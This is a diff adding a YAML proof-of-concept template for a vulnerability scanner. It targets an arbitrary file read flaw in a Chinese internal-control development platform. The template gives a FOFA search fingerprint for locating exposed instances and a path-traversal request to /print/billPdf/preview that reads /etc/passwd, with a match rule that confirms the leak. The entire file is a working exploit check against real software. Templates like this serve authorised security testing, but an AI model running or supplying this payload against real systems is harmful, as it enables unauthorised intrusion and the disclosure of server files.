@@ -1,0 +1,16 @@
+id: poc-yaml-znk-preview-anyfile-read
+info:
+  name: 真内控国产化开发平台 preview 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 真内控国产化开发平台
+  fofa: body="js/npm.echarts.js"
+requests:
+- method: GET
+  path: /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\n!contains(body,\"<\") &&\ncontains(content_type,\"application/pdf\"\
+    )\n"
+variables: {}
+transport: http
